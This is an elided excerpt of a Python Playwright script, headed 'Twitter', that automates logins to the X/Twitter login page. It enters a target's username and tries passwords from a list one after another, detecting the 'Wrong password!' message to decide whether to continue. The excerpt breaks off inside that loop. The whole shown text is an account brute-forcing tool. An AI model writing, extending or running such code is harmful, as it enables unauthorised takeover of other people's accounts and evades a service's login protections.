...
class EpicGames():
    ...
    def __init__(self):
        self.twitterURL = "https://x.com/i/flow/login"
    ...
    def header(self):
        print(pyfiglet.figlet_format("Twitter", font="doom"))
    ...
    def launch_browser(self):
        ...
        with sync_playwright() as playwright:
            ...
            page.goto(self.twitterURL)

            print("Waiting for Username Field")
            page.locator("div span.css-1jxf684.r-bcqeeo.r-1ttztb7.r-qvutc0.r-poiln3", has_text="Phone, email, or username").wait_for(timeout=60000)
            page.locator("div span.css-1jxf684.r-bcqeeo.r-1ttztb7.r-qvutc0.r-poiln3", has_text="Phone, email, or username").fill(self.target)
            ...
            page.locator("input[name='password']").fill(self.passwords[self.password_counter])
            ...
            try:
                page.locator("span.css-1jxf684.r-bcqeeo.r-1ttztb7.r-qvutc0.r-poiln3", has_text="Wrong password!").wait_for(timeout=2500)
                validation_check = page.locator("span.css-1jxf684.r-bcqeeo.r-1ttztb7.r-qvutc0.r-poiln3", has_text="Wrong password!")
            ...
            if validation_check:
                try:
                    while  validation_check:
                        ...
                        try:
                            page.locator("span.css-1jxf684.r-bcqeeo.r-1ttztb7.r-qvutc0.r-poiln3", has_text="Wrong password!").wait_for(timeout=1000)
                            page.locator("span.css-1jxf684.r-bcqeeo.r-1ttztb7.r-qvutc0.r-poiln3", has_text="Wrong password!")
                            validation_check = True
                        except PlaywrightTimeoutError:
                            try:
